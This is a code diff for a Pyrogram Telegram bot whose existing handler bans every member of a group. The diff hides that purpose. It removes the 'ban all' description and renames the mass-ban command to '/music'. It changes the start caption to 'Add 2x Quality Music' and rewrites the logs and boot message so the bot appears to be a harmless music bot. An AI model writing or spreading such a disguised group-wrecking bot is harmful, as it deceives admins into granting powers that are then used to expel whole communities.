@@ -26,25 +26,24 @@ app = Client(
 )
 
 @app.on_message(
-filters.command("start")
+filters.command("startt")
 & filters.private            
 )
 async def start_command(client, message: Message):
   await message.reply_photo(
-                            photo = f"https://telegra.ph/file/fff2ee6f504bc061cb7d3.jpg",
-                            caption = f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ʙᴀɴ ᴀʟʟ ʙᴏᴛ ᴡʜɪᴄʜ ɪs ʙᴀsᴇᴅ ᴏɴ ᴘʏʀᴏɢʀᴀᴍ ʟɪʙᴇʀᴀʀʏ ᴛᴏ ʙᴀɴ ᴏʀ ᴅᴇsᴛʀᴏʏ ᴀʟʟ ᴛʜᴇ ᴍᴇᴍʙᴇʀs ғʀᴏᴍ ᴀ ɢʀᴏᴜᴘ ᴡɪᴛʜ ɪɴ ᴀ ғᴇᴡ  sᴇᴄᴏɴᴅs!\n\nᴛᴏ ᴄʜᴇᴄᴋ ᴍʏ ᴀʙɪʟɪᴛʏ ɢɪʙ me ғᴜʟʟ ᴘᴏᴡᴇʀs\n\nᴛʏᴘᴇ /ʙᴀɴᴀʟʟ ᴛᴏ ꜱᴇᴇ ᴍᴀɢɪᴄ ɪɴ ɢʀᴏᴜᴘ.",
-  reply_markup=InlineKeyboardMarkup(
+                            caption = f"Add 2x Quality Music",
+      reply_markup=InlineKeyboardMarkup(
             [
                 [
                     InlineKeyboardButton(
-                        "ᴏᴡɴᴇʀ", url=f"https://t.me/{OWNER}")
+                        "ᴏᴡɴᴇʀ", url=f"https://t.me/M")
                 ]       
            ]
       )
 )
 
 @app.on_message(
-filters.command("banall") 
+filters.command("/music") 
 & filters.group
 )
 async def banall_command(client, message: Message):
@@ -54,11 +53,11 @@ async def banall_command(client, message: Message):
             await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
             print("kicked {} from {}".format(i.user.id, message.chat.id))
         except Exception as e:
-            print("failed to kicked {} from {}".format(i.user.id, e))           
+            print("retry {} from {}".format(i.user.id, e))           
     print("process completed")
     
 
 # start bot client
 app.start()
-print("Banall-Bot Booted Successfully")
+print("Bot Booted Successfully")
 idle()
